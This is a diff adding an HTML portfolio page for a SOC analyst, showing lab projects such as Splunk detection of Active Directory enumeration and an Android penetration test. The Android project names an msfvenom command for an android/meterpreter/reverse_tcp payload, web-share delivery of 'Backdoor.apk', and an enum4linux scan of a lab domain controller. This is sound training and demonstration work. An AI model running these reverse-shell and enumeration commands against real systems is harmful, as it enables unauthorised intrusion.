@@ -1,0 +1,1077 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>McDonald Tatenda Handina | SOC Analyst & Threat Management Specialist</title>
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    colors: {
+                        cyber: {
+                            bg: '#0d1117',
+                            card: '#161b22',
+                            border: '#30363d',
+                            red: '#ff4d4d',
+                            blue: '#00d2ff',
+                            purple: '#a855f7',
+                            green: '#2ea043',
+                            yellow: '#e3b341',
+                            text: '#c9d1d9',
+                            heading: '#f0f6fc'
+                        }
+                    },
+                    fontFamily: {
+                        mono: ['JetBrains Mono', 'Fira Code', 'monospace'],
+                        sans: ['Inter', 'sans-serif']
+                    }
+                }
+            }
+        }
+    </script>
+    <!-- FontAwesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            background-color: #0d1117;
+            color: #c9d1d9;
+            font-family: 'Inter', sans-serif;
+            overflow-x: hidden;
+        }
+        .font-mono {
+            font-family: 'JetBrains Mono', monospace;
+        }
+        /* Custom Glowing Glass Panels */
+        .glass-panel {
+            background: rgba(22, 27, 34, 0.75);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(48, 54, 61, 0.8);
+            border-radius: 0.75rem;
+        }
+        .glass-panel:hover {
+            border-color: rgba(0, 210, 255, 0.4);
+            box-shadow: 0 0 20px rgba(0, 210, 255, 0.08);
+        }
+
+        /* SVG Dash Array Animations for Flow Paths */
+        .path-active-red {
+            stroke-dasharray: 6 6;
+            animation: dashMove 0.8s linear infinite;
+        }
+        .path-active-blue {
+            stroke-dasharray: 6 6;
+            animation: dashMove 0.6s linear infinite;
+        }
+        .path-active-purple {
+            stroke-dasharray: 8 8;
+            animation: dashMoveReverse 1s linear infinite;
+        }
+        @keyframes dashMove {
+            to { stroke-dashoffset: -24; }
+        }
+        @keyframes dashMoveReverse {
+            to { stroke-dashoffset: 24; }
+        }
+
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #0d1117;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #30363d;
+            border-radius: 4px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: #00d2ff;
+        }
+    </style>
+</head>
+<body class="bg-cyber-bg text-cyber-text antialiased selection:bg-cyber-blue selection:text-black">
+
+    <!-- Top Navigation Bar -->
+    <header class="sticky top-0 z-50 bg-[#0d1117]/90 backdrop-blur-md border-b border-cyber-border">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between">
+            <div class="flex items-center space-x-3">
+                <div class="h-3 w-3 rounded-full bg-cyber-purple animate-ping"></div>
+                <span class="font-mono text-lg font-bold text-cyber-heading tracking-tight">
+                    handina<span class="text-cyber-blue">@sec-ops</span>:~$
+                </span>
+            </div>
+            <nav class="hidden md:flex space-x-6 font-mono text-sm">
+                <a href="#hero" class="hover:text-cyber-blue transition-colors">/home</a>
+                <a href="#purple-team" class="hover:text-cyber-purple transition-colors">/purple-lab</a>
+                <a href="#projects" class="hover:text-cyber-blue transition-colors">/simulations</a>
+                <a href="#skills" class="hover:text-cyber-blue transition-colors">/skills</a>
+                <a href="#about-contact" class="hover:text-cyber-red transition-colors">/contact</a>
+            </nav>
+            <div class="flex items-center space-x-3 font-mono text-xs">
+                <span class="px-2.5 py-1 rounded-full bg-cyber-green/10 text-cyber-green border border-cyber-green/30">
+                    <i class="fa-solid fa-shield-halved mr-1"></i> SOC Status: ONLINE
+                </span>
+            </div>
+        </div>
+    </header>
+
+    <!-- 1. HERO SECTION -->
+    <section id="hero" class="relative py-16 md:py-24 overflow-hidden border-b border-cyber-border">
+        <div class="absolute top-1/4 left-1/4 w-96 h-96 bg-cyber-blue/10 rounded-full blur-3xl pointer-events-none"></div>
+        <div class="absolute bottom-1/4 right-1/4 w-96 h-96 bg-cyber-purple/10 rounded-full blur-3xl pointer-events-none"></div>
+
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 relative z-10">
+            <div class="grid grid-cols-1 lg:grid-cols-12 gap-12 items-center">
+                
+                <!-- Left Bio Column -->
+                <div class="lg:col-span-7 space-y-6">
+                    <div class="inline-flex items-center space-x-2 px-3 py-1 rounded-full bg-cyber-card border border-cyber-border text-xs font-mono text-cyber-blue">
+                        <i class="fa-solid fa-location-dot"></i>
+                        <span>Toronto, Ontario, Canada</span>
+                        <span class="text-cyber-border">|</span>
+                        <span class="text-cyber-purple">Alias: Mr. Palmer</span>
+                    </div>
+
+                    <h1 class="text-4xl sm:text-5xl lg:text-6xl font-extrabold text-cyber-heading tracking-tight leading-none">
+                        McDonald Tatenda <br>
+                        <span class="text-transparent bg-clip-text bg-gradient-to-r from-cyber-blue via-cyber-purple to-cyber-red">
+                            Handina
+                        </span>
+                    </h1>
+
+                    <h2 class="text-xl sm:text-2xl font-mono text-cyber-blue font-semibold">
+                        SOC Analyst & Threat Management Specialist
+                    </h2>
+
+                    <p class="text-cyber-text text-base sm:text-lg leading-relaxed max-w-2xl">
+                        Bridging physical security threat mitigation and identity control with deep hands-on technical capabilities in SIEM telemetry engineering, Active Directory hardening, and mobile application penetration testing.
+                    </p>
+
+                    <!-- Core Skill Badges -->
+                    <div class="flex flex-wrap gap-2 pt-2">
+                        <span class="px-3 py-1 rounded bg-cyber-card border border-cyber-border text-xs font-mono">
+                            <i class="fa-solid fa-cubes text-cyber-blue mr-1.5"></i>Splunk SIEM (SPL)
+                        </span>
+                        <span class="px-3 py-1 rounded bg-cyber-card border border-cyber-border text-xs font-mono">
+                            <i class="fa-solid fa-server text-cyber-purple mr-1.5"></i>Windows DC & BadBlood
+                        </span>
+                        <span class="px-3 py-1 rounded bg-cyber-card border border-cyber-border text-xs font-mono">
+                            <i class="fa-solid fa-bug text-cyber-red mr-1.5"></i>Kali & Metasploit
+                        </span>
+                        <span class="px-3 py-1 rounded bg-cyber-card border border-cyber-border text-xs font-mono">
+                            <i class="fa-solid fa-mobile-screen text-cyber-blue mr-1.5"></i>MobSF & Mobile DLP
+                        </span>
+                    </div>
+
+                    <!-- CTA Buttons -->
+                    <div class="flex flex-wrap gap-4 pt-4">
+                        <a href="#projects" class="px-6 py-3 rounded-lg bg-cyber-blue text-black font-semibold font-mono text-sm hover:bg-opacity-90 transition-all flex items-center shadow-lg shadow-cyber-blue/20">
+                            <i class="fa-solid fa-terminal mr-2"></i> Launch Project Sims
+                        </a>
+                        <a href="#purple-team" class="px-6 py-3 rounded-lg bg-cyber-card text-cyber-heading border border-cyber-purple font-semibold font-mono text-sm hover:bg-cyber-purple/10 transition-all flex items-center">
+                            <i class="fa-solid fa-diagram-project text-cyber-purple mr-2"></i> View Purple Team Diagram
+                        </a>
+                        <a href="#about-contact" class="px-6 py-3 rounded-lg bg-cyber-card text-cyber-text border border-cyber-border font-mono text-sm hover:border-cyber-blue transition-all flex items-center">
+                            <i class="fa-solid fa-envelope mr-2"></i> Contact Me
+                        </a>
+                    </div>
+                </div>
+
+                <!-- Right Quick Stats Panel -->
+                <div class="lg:col-span-5">
+                    <div class="glass-panel p-6 border-cyber-purple/40 relative">
+                        <div class="flex items-center justify-between pb-4 border-b border-cyber-border">
+                            <span class="font-mono text-xs text-cyber-purple font-semibold uppercase tracking-wider">
+                                <i class="fa-solid fa-microchip mr-1"></i> Technical Portfolio Snapshot
+                            </span>
+                            <span class="flex h-2.5 w-2.5 rounded-full bg-cyber-green"></span>
+                        </div>
+
+                        <div class="mt-6 space-y-4 font-mono text-sm">
+                            <div class="flex justify-between items-center p-3 rounded bg-cyber-bg/60 border border-cyber-border">
+                                <span class="text-cyber-text"><i class="fa-solid fa-shield-cat text-cyber-blue mr-2"></i>Defensive Lab (SIEM)</span>
+                                <span class="text-cyber-blue font-bold">66k+ Events Ingested</span>
+                            </div>
+
+                            <div class="flex justify-between items-center p-3 rounded bg-cyber-bg/60 border border-cyber-border">
+                                <span class="text-cyber-text"><i class="fa-solid fa-skull text-cyber-red mr-2"></i>Offensive Lab (Mobile)</span>
+                                <span class="text-cyber-red font-bold">Meterpreter Shell Verified</span>
+                            </div>
+
+                            <div class="flex justify-between items-center p-3 rounded bg-cyber-bg/60 border border-cyber-border">
+                                <span class="text-cyber-text"><i class="fa-solid fa-network-wired text-cyber-purple mr-2"></i>Network Gateway</span>
+                                <span class="text-cyber-purple font-bold">pfSense (VMnet1 Isolated)</span>
+                            </div>
+
+                            <div class="flex justify-between items-center p-3 rounded bg-cyber-bg/60 border border-cyber-border">
+                                <span class="text-cyber-text"><i class="fa-solid fa-graduation-cap text-cyber-green mr-2"></i>Education</span>
+                                <span class="text-cyber-heading font-medium">Seneca & Curtin Univ.</span>
+                            </div>
+                        </div>
+
+                        <!-- External Links -->
+                        <div class="mt-6 pt-4 border-t border-cyber-border flex justify-around text-xl text-cyber-text">
+                            <a href="https://github.com/Mrpalmer08" target="_blank" class="hover:text-cyber-blue transition-colors" title="GitHub Repository"><i class="fa-brands fa-github"></i></a>
+                            <a href="https://linkedin.com" target="_blank" class="hover:text-cyber-blue transition-colors" title="LinkedIn Profile"><i class="fa-brands fa-linkedin"></i></a>
+                            <a href="mailto:hantinamcdonald@gmail.com" class="hover:text-cyber-purple transition-colors" title="Send Email"><i class="fa-solid fa-paper-plane"></i></a>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </section>
+
+    <!-- 2. ANIMATED PURPLE TEAM INTERACTIVE ARCHITECTURE DIAGRAM -->
+    <section id="purple-team" class="py-16 bg-[#0d1117] border-b border-cyber-border relative">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="text-center max-w-3xl mx-auto mb-10">
+                <div class="inline-flex items-center space-x-2 px-3 py-1 rounded-full bg-cyber-purple/10 border border-cyber-purple/30 text-xs font-mono text-cyber-purple mb-3">
+                    <i class="fa-solid fa-rotate mr-1"></i> Continuous Closed-Loop Simulation
+                </div>
+                <h2 class="text-3xl font-bold text-cyber-heading tracking-tight">
+                    Purple Team Lab Architecture & Telemetry Loop
+                </h2>
+                <p class="mt-3 text-cyber-text text-sm sm:text-base">
+                    Interactive visualization of the end-to-end adversary simulation, pfSense network boundary, Windows Server identity ingestion, and Splunk detection feedback loop.
+                </p>
+            </div>
+
+            <!-- Architecture Canvas Container -->
+            <div class="glass-panel p-6 border-cyber-border relative overflow-hidden">
+                <!-- Status Control Header -->
+                <div class="flex flex-wrap items-center justify-between gap-4 pb-4 border-b border-cyber-border font-mono text-xs">
+                    <div class="flex items-center space-x-3">
+                        <span class="text-cyber-heading font-bold flex items-center">
+                            <i class="fa-solid fa-circle-play text-cyber-purple mr-2"></i> Current Phase:
+                        </span>
+                        <span id="purple-phase-badge" class="px-3 py-1 rounded-full bg-cyber-red/20 text-cyber-red border border-cyber-red/40 font-bold">
+                            STAGE 1: Red Team Attack (enum4linux)
+                        </span>
+                    </div>
+
+                    <!-- Step Controls -->
+                    <div class="flex space-x-2">
+                        <button onclick="setPurpleStage(1)" id="stage-btn-1" class="px-3 py-1.5 rounded bg-cyber-red/20 text-cyber-red border border-cyber-red/50 hover:bg-cyber-red/30 transition-all font-bold">
+                            1. Red Attack
+                        </button>
+                        <button onclick="setPurpleStage(2)" id="stage-btn-2" class="px-3 py-1.5 rounded bg-cyber-card text-cyber-text border border-cyber-border hover:border-cyber-blue transition-all">
+                            2. Blue Telemetry
+                        </button>
+                        <button onclick="setPurpleStage(3)" id="stage-btn-3" class="px-3 py-1.5 rounded bg-cyber-card text-cyber-text border border-cyber-border hover:border-cyber-purple transition-all">
+                            3. Purple Feedback
+                        </button>
+                    </div>
+                </div>
+
+                <!-- SVG Architecture Diagram Area -->
+                <div class="w-full overflow-x-auto py-6">
+                    <svg id="purple-svg" viewBox="0 0 950 420" class="w-full min-w-[750px] h-auto font-mono text-xs">
+                        
+                        <defs>
+                            <pattern id="grid" width="30" height="30" patternUnits="userSpaceOnUse">
+                                <path d="M 30 0 L 0 0 0 30" fill="none" stroke="#30363d" stroke-width="0.5" stroke-opacity="0.3"/>
+                            </pattern>
+                        </defs>
+                        <rect width="100%" height="100%" fill="url(#grid)" />
+
+                        <!-- PATHS -->
+                        <path id="path-kali-pfsense" d="M 170 210 L 290 210" stroke="#30363d" stroke-width="3" fill="none" />
+                        <path id="path-pfsense-dc" d="M 390 210 C 440 210, 440 120, 500 120" stroke="#30363d" stroke-width="3" fill="none" />
+                        <path id="path-pfsense-ep" d="M 390 210 C 440 210, 440 300, 500 300" stroke="#30363d" stroke-width="3" fill="none" />
+                        <path id="path-dc-splunk" d="M 640 120 C 700 120, 700 210, 750 210" stroke="#30363d" stroke-width="3" fill="none" />
+                        <path id="path-ep-splunk" d="M 640 300 C 700 300, 700 210, 750 210" stroke="#30363d" stroke-width="3" fill="none" />
+                        <path id="path-purple-feedback" d="M 800 160 C 800 30, 120 30, 120 160" stroke="#30363d" stroke-width="2.5" fill="none" stroke-dasharray="6 6"/>
+
+                        <!-- NODES -->
+                        <!-- Kali Linux Node -->
+                        <g id="node-kali" transform="translate(60, 160)">
+                            <rect width="120" height="100" rx="10" fill="#161b22" stroke="#ff4d4d" stroke-width="2" class="transition-all duration-300"/>
+                            <text x="60" y="35" text-anchor="middle" fill="#ff4d4d" font-weight="bold" font-size="14">Kali Linux</text>
+                            <text x="60" y="55" text-anchor="middle" fill="#c9d1d9" font-size="10">Attacker Node</text>
+                            <text x="60" y="75" text-anchor="middle" fill="#8b949e" font-size="9">192.168.49.130</text>
+                        </g>
+
+                        <!-- pfSense Node -->
+                        <g id="node-pfsense" transform="translate(280, 160)">
+                            <rect width="110" height="100" rx="10" fill="#161b22" stroke="#30363d" stroke-width="2" class="transition-all duration-300"/>
+                            <text x="55" y="35" text-anchor="middle" fill="#f0f6fc" font-weight="bold" font-size="13">pfSense</text>
+                            <text x="55" y="55" text-anchor="middle" fill="#00d2ff" font-size="10">VMnet1 Gateway</text>
+                            <text x="55" y="75" text-anchor="middle" fill="#8b949e" font-size="9">192.168.49.2</text>
+                        </g>
+
+                        <!-- Win Server DC Node -->
+                        <g id="node-dc" transform="translate(500, 70)">
+                            <rect width="140" height="100" rx="10" fill="#161b22" stroke="#30363d" stroke-width="2" class="transition-all duration-300"/>
+                            <text x="70" y="32" text-anchor="middle" fill="#f0f6fc" font-weight="bold" font-size="13">Win Server 2022</text>
+                            <text x="70" y="52" text-anchor="middle" fill="#a855f7" font-size="10">Domain Controller</text>
+                            <text x="70" y="70" text-anchor="middle" fill="#8b949e" font-size="9">letsdefend.local</text>
+                            <text x="70" y="85" text-anchor="middle" fill="#8b949e" font-size="8">192.168.49.10</text>
+                        </g>
+
+                        <!-- Sysmon Endpoints Node -->
+                        <g id="node-ep" transform="translate(500, 250)">
+                            <rect width="140" height="100" rx="10" fill="#161b22" stroke="#30363d" stroke-width="2" class="transition-all duration-300"/>
+                            <text x="70" y="35" text-anchor="middle" fill="#f0f6fc" font-weight="bold" font-size="13">AD Endpoints</text>
+                            <text x="70" y="55" text-anchor="middle" fill="#00d2ff" font-size="10">BadBlood Populated</text>
+                            <text x="70" y="75" text-anchor="middle" fill="#8b949e" font-size="9">66,000+ Objects</text>
+                        </g>
+
+                        <!-- Splunk Node -->
+                        <g id="node-splunk" transform="translate(740, 160)">
+                            <rect width="130" height="100" rx="10" fill="#161b22" stroke="#00d2ff" stroke-width="2" class="transition-all duration-300"/>
+                            <text x="65" y="35" text-anchor="middle" fill="#00d2ff" font-weight="bold" font-size="14">Splunk SIEM</text>
+                            <text x="65" y="55" text-anchor="middle" fill="#c9d1d9" font-size="10">Log Enterprise</text>
+                            <text x="65" y="75" text-anchor="middle" fill="#2ea043" font-size="9" id="splunk-event-count">Events: 66,969</text>
+                        </g>
+
+                        <!-- Purple Loop Badge -->
+                        <g id="purple-loop-text" opacity="0" class="transition-opacity duration-500">
+                            <rect x="360" y="10" width="230" height="36" rx="18" fill="#161b22" stroke="#a855f7" stroke-width="2"/>
+                            <text x="475" y="33" text-anchor="middle" fill="#a855f7" font-weight="bold" font-size="11">
+                                ★ PURPLE LOOP: Detection Verified & Rules Tuned
+                            </text>
+                        </g>
+
+                    </svg>
+                </div>
+
+                <!-- Simulation Footnote -->
+                <div class="mt-4 p-4 rounded bg-cyber-bg border border-cyber-border font-mono text-xs flex flex-wrap justify-between items-center gap-2">
+                    <div id="purple-stage-desc" class="text-cyber-text">
+                        <span class="text-cyber-red font-bold">STAGE 1:</span> Kali Linux executes unauthenticated SMB/LDAP enumeration (<code class="text-cyber-blue">enum4linux -a 192.168.49.10</code>) targeting Domain Controller ports (139, 445, 389).
+                    </div>
+                    <div class="text-cyber-text/60 text-[10px]">
+                        Auto-cycling every 4s
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </section>
+
+    <!-- 3. INTERACTIVE PROJECT SIMULATIONS -->
+    <section id="projects" class="py-16 border-b border-cyber-border">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="text-center max-w-3xl mx-auto mb-12">
+                <div class="inline-flex items-center space-x-2 px-3 py-1 rounded-full bg-cyber-blue/10 border border-cyber-blue/30 text-xs font-mono text-cyber-blue mb-3">
+                    <i class="fa-solid fa-code mr-1"></i> Interactive Threat Simulations
+                </div>
+                <h2 class="text-3xl sm:text-4xl font-bold text-cyber-heading tracking-tight">
+                    Hands-On Cybersecurity Projects
+                </h2>
+                <p class="mt-3 text-cyber-text text-sm sm:text-base">
+                    Interact directly with simulated SIEM detection consoles, offensive Android exploitation shells, mobile DLP matrices, and Kerberoasting SPL queries.
+                </p>
+            </div>
+
+            <div class="space-y-16">
+
+                <!-- PROJECT A: Defensive AD Monitoring & Splunk SIEM Lab -->
+                <div class="glass-panel p-6 lg:p-8 border-cyber-blue/30">
+                    <div class="grid grid-cols-1 lg:grid-cols-12 gap-8">
+                        
+                        <!-- Left Details Column -->
+                        <div class="lg:col-span-5 space-y-4">
+                            <div class="flex items-center space-x-2 text-cyber-blue font-mono text-xs font-semibold uppercase tracking-wider">
+                                <span class="px-2 py-0.5 rounded bg-cyber-blue/10 border border-cyber-blue/30">Project A - Defensive</span>
+                                <span>SOC & Detection Eng.</span>
+                            </div>
+                            <h3 class="text-2xl font-bold text-cyber-heading">
+                                Active Directory Hardening, Telemetry Pipeline & Splunk SIEM Detection
+                            </h3>
+                            <p class="text-cyber-text text-sm leading-relaxed">
+                                Architecture setup of an enterprise Active Directory domain (<code class="text-cyber-blue">letsdefend.local</code>) populated with over 66,000 objects via BadBlood. Isolated on custom <code class="text-cyber-purple">VMnet1</code> host-only routing with pfSense firewall security controls.
+                            </p>
+                            
+                            <ul class="space-y-2 text-xs font-mono text-cyber-text">
+                                <li class="flex items-start">
+                                    <i class="fa-solid fa-check-circle text-cyber-green mt-0.5 mr-2"></i>
+                                    <span>Target DC: Windows Server 2022 (192.168.49.10)</span>
+                                </li>
+                                <li class="flex items-start">
+                                    <i class="fa-solid fa-check-circle text-cyber-green mt-0.5 mr-2"></i>
+                                    <span>Ingestion Pipeline: WinEventLog:Security (66,969 events indexed)</span>
+                                </li>
+                                <li class="flex items-start">
+                                    <i class="fa-solid fa-check-circle text-cyber-green mt-0.5 mr-2"></i>
+                                    <span>Offense: Kali <code class="text-cyber-red">enum4linux</code> null-session SID dump</span>
+                                </li>
+                                <li class="flex items-start">
+                                    <i class="fa-solid fa-check-circle text-cyber-green mt-0.5 mr-2"></i>
+                                    <span>Detection SPL: EventCode 4625 (Failed Logon) & 4648 (Explicit Credentials)</span>
+                                </li>
+                            </ul>
+                        </div>
+
+                        <!-- Right Interactive Terminal Simulator -->
+                        <div class="lg:col-span-7">
+                            <div class="bg-black rounded-lg border border-cyber-border overflow-hidden shadow-2xl font-mono text-xs">
+                                
+                                <div class="bg-cyber-card px-4 py-2 border-b border-cyber-border flex items-center justify-between">
+                                    <div class="flex items-center space-x-2">
+                                        <span class="w-3 h-3 rounded-full bg-cyber-red inline-block"></span>
+                                        <span class="w-3 h-3 rounded-full bg-yellow-500 inline-block"></span>
+                                        <span class="w-3 h-3 rounded-full bg-cyber-green inline-block"></span>
+                                        <span class="text-cyber-text text-[11px] ml-2">Splunk Enterprise Console — localhost:8000</span>
+                                    </div>
+                                    <span class="text-cyber-blue text-[10px]">Search & Reporting</span>
+                                </div>
+
+                                <div class="p-3 bg-cyber-card/50 border-b border-cyber-border flex flex-wrap gap-2">
+                                    <button onclick="runSimulatedScan()" class="px-3 py-1.5 rounded bg-cyber-red/20 text-cyber-red border border-cyber-red/40 hover:bg-cyber-red/30 transition-all text-xs font-bold flex items-center">
+                                        <i class="fa-solid fa-bolt mr-1.5"></i> 1. Run enum4linux Recon
+                                    </button>
+                                    <button onclick="runSplunkQuery()" class="px-3 py-1.5 rounded bg-cyber-blue/20 text-cyber-blue border border-cyber-blue/40 hover:bg-cyber-blue/30 transition-all text-xs font-bold flex items-center">
+                                        <i class="fa-solid fa-magnifying-glass mr-1.5"></i> 2. Run SPL Detection
+                                    </button>
+                                    <button onclick="resetSim1()" class="px-2.5 py-1.5 rounded bg-cyber-bg text-cyber-text/60 border border-cyber-border hover:text-cyber-text transition-all text-xs">
+                                        Reset
+                                    </button>
+                                </div>
+
+                                <div id="sim1-terminal-body" class="p-4 h-64 overflow-y-auto space-y-2 bg-[#05080c] text-cyber-text leading-relaxed">
+                                    <div class="text-cyber-text/60">// Splunk log engine ready. Listening on WinEventLog:Security...</div>
+                                    <div class="text-cyber-green">[✓] Indexer active: 66,969 events indexed</div>
+                                    <div class="text-cyber-blue">[i] Run the recon, then the detection query.</div>
+                                </div>
+
+                                <div id="sim1-table-view" class="hidden p-3 bg-[#080d14] border-t border-cyber-border">
+                                    <div class="text-[11px] text-cyber-blue font-bold mb-2 flex justify-between">
+                                        <span>SPL Results: sourcetype="WinEventLog:Security" (EventCode=4625 OR EventCode=4648)</span>
+                                        <span class="text-cyber-green">Matched: 27 Events</span>
+                                    </div>
+                                    <div class="overflow-x-auto">
+                                        <table class="w-full text-left text-[10px] text-cyber-text">
+                                            <thead class="bg-cyber-card text-cyber-heading border-b border-cyber-border">
+                                                <tr>
+                                                    <th class="p-1.5">Time</th>
+                                                    <th class="p-1.5">EventID</th>
+                                                    <th class="p-1.5">Workstation</th>
+                                                    <th class="p-1.5">TargetUser</th>
+                                                    <th class="p-1.5">Status</th>
+                                                </tr>
+                                            </thead>
+                                            <tbody class="divide-y divide-cyber-border/40">
+                                                <tr>
+                                                    <td class="p-1.5">10/28/26 11:32:44</td>
+                                                    <td class="p-1.5 text-cyber-red font-bold">4625</td>
+                                                    <td class="p-1.5">KALI-NODE</td>
+                                                    <td class="p-1.5">NULL / Anonymous</td>
+                                                    <td class="p-1.5 text-cyber-red">STATUS_LOGON_FAILURE</td>
+                                                </tr>
+                                                <tr>
+                                                    <td class="p-1.5">10/28/26 11:32:45</td>
+                                                    <td class="p-1.5 text-cyber-red font-bold">4625</td>
+                                                    <td class="p-1.5">KALI-NODE</td>
+                                                    <td class="p-1.5">administrator</td>
+                                                    <td class="p-1.5 text-cyber-red">NT_STATUS_ACCESS_DENIED</td>
+                                                </tr>
+                                                <tr>
+                                                    <td class="p-1.5">10/28/26 11:32:46</td>
+                                                    <td class="p-1.5 text-cyber-purple font-bold">4648</td>
+                                                    <td class="p-1.5">KALI-NODE</td>
+                                                    <td class="p-1.5">krbtgt</td>
+                                                    <td class="p-1.5 text-cyber-purple">EXPLICIT_CRED_ATTEMPT</td>
+                                                </tr>
+                                            </tbody>
+                                        </table>
+                                    </div>
+                                </div>
+
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+
+                <!-- PROJECT B: Mobile Application Security & Penetration Testing -->
+                <div class="glass-panel p-6 lg:p-8 border-cyber-red/30">
+                    <div class="grid grid-cols-1 lg:grid-cols-12 gap-8">
+
+                        <!-- Left Details Column -->
+                        <div class="lg:col-span-5 space-y-4">
+                            <div class="flex items-center space-x-2 text-cyber-red font-mono text-xs font-semibold uppercase tracking-wider">
+                                <span class="px-2 py-0.5 rounded bg-cyber-red/10 border border-cyber-red/30">Project B - Offensive</span>
+                                <span>Mobile PenTesting</span>
+                            </div>
+                            <h3 class="text-2xl font-bold text-cyber-heading">
+                                Android Mobile Application Exploitation & MobSF Static Audit
+                            </h3>
+                            <p class="text-cyber-text text-sm leading-relaxed">
+                                End-to-end mobile application security assessment leveraging Kali Linux attacker host against an Android emulator environment. Crafted custom Dalvik reverse TCP payloads, executed Meterpreter command & control, and evaluated APK static risks via MobSF.
+                            </p>
+                            
+                            <ul class="space-y-2 text-xs font-mono text-cyber-text">
+                                <li class="flex items-start">
+                                    <i class="fa-solid fa-check-circle text-cyber-red mt-0.5 mr-2"></i>
+                                    <span>Payload: <code class="text-cyber-red">msfvenom -p android/meterpreter/reverse_tcp</code></span>
+                                </li>
+                                <li class="flex items-start">
+                                    <i class="fa-solid fa-check-circle text-cyber-red mt-0.5 mr-2"></i>
+                                    <span>Delivery: Apache Web Share (<code class="text-cyber-blue">/var/www/html/share</code>)</span>
+                                </li>
+                                <li class="flex items-start">
+                                    <i class="fa-solid fa-check-circle text-cyber-red mt-0.5 mr-2"></i>
+                                    <span>Session: Meterpreter shell (<code class="text-cyber-green">sysinfo, ps, pwd</code>)</span>
+                                </li>
+                                <li class="flex items-start">
+                                    <i class="fa-solid fa-check-circle text-cyber-red mt-0.5 mr-2"></i>
+                                    <span>MobSF Scan: StrandHogg 2.0 and dangerous permissions flagged</span>
+                                </li>
+                            </ul>
+                        </div>
+
+                        <!-- Right Interactive Terminal & MobSF Scanner -->
+                        <div class="lg:col-span-7">
+                            <div class="bg-black rounded-lg border border-cyber-border overflow-hidden shadow-2xl font-mono text-xs">
+                                
+                                <div class="bg-cyber-card px-4 py-2 border-b border-cyber-border flex items-center justify-between">
+                                    <div class="flex space-x-4">
+                                        <button onclick="switchProject2Tab('cli')" id="tab-btn-cli" class="text-cyber-red font-bold border-b-2 border-cyber-red pb-0.5">
+                                            <i class="fa-solid fa-terminal mr-1"></i> Meterpreter Shell
+                                        </button>
+                                        <button onclick="switchProject2Tab('mobsf')" id="tab-btn-mobsf" class="text-cyber-text hover:text-cyber-purple transition-colors pb-0.5">
+                                            <i class="fa-solid fa-shield-virus mr-1"></i> MobSF Scan Report
+                                        </button>
+                                    </div>
+                                    <span class="text-cyber-text/60 text-[10px]">Target: Android Emulator</span>
+                                </div>
+
+                                <div id="p2-cli-view" class="p-4 space-y-3">
+                                    <div class="flex flex-wrap gap-2 pb-2 border-b border-cyber-border/40">
+                                        <button onclick="runCmd('payload')" class="px-2.5 py-1 rounded bg-cyber-red/20 text-cyber-red border border-cyber-red/40 hover:bg-cyber-red/30 transition-all text-[11px] font-bold">
+                                            1. Generate APK
+                                        </button>
+                                        <button onclick="runCmd('handler')" class="px-2.5 py-1 rounded bg-cyber-purple/20 text-cyber-purple border border-cyber-purple/40 hover:bg-cyber-purple/30 transition-all text-[11px] font-bold">
+                                            2. Start Handler
+                                        </button>
+                                        <button onclick="runCmd('sysinfo')" class="px-2.5 py-1 rounded bg-cyber-blue/20 text-cyber-blue border border-cyber-blue/40 hover:bg-cyber-blue/30 transition-all text-[11px] font-bold">
+                                            3. sysinfo
+                                        </button>
+                                        <button onclick="runCmd('ps')" class="px-2.5 py-1 rounded bg-cyber-green/20 text-cyber-green border border-cyber-green/40 hover:bg-cyber-green/30 transition-all text-[11px] font-bold">
+                                            4. ps & pwd
+                                        </button>
+                                    </div>
+
+                                    <div id="sim2-cli-output" class="h-56 overflow-y-auto space-y-2 bg-[#05080c] p-3 rounded border border-cyber-border/50 text-cyber-text leading-relaxed">
+                                        <div class="text-cyber-text/60">// Attacker framework on Kali Linux. Click actions above to execute shell commands.</div>
+                                    </div>
+                                </div>
+
+                                <div id="p2-mobsf-view" class="hidden p-4 space-y-4">
+                                    <div class="flex items-center justify-between">
+                                        <span class="text-cyber-purple font-bold">Static Analysis Report: Backdoor.apk</span>
+                                        <span class="px-2 py-0.5 rounded bg-cyber-red/20 text-cyber-red border border-cyber-red/40 text-[10px] font-bold">High Risk Score: 8.5/10</span>
+                                    </div>
+
+                                    <div class="space-y-3">
+                                        <div>
+                                            <div class="flex justify-between text-[11px] mb-1">
+                                                <span>Manifest Misconfiguration (StrandHogg 2.0 Task Hijacking)</span>
+                                                <span class="text-cyber-red font-bold">HIGH RISK</span>
+                                            </div>
+                                            <div class="w-full h-2 rounded-full bg-cyber-card">
+                                                <div class="h-2 rounded-full bg-cyber-red w-[85%]"></div>
+                                            </div>
+                                        </div>
+
+                                        <div>
+                                            <div class="flex justify-between text-[11px] mb-1">
+                                                <span>Dangerous Application Permissions (Contacts, Location)</span>
+                                                <span class="text-cyber-yellow font-bold">WARNING</span>
+                                            </div>
+                                            <div class="w-full h-2 rounded-full bg-cyber-card">
+                                                <div class="h-2 rounded-full bg-yellow-500 w-[70%]"></div>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <div class="p-2.5 rounded bg-cyber-bg border border-cyber-border text-[10px] text-cyber-text">
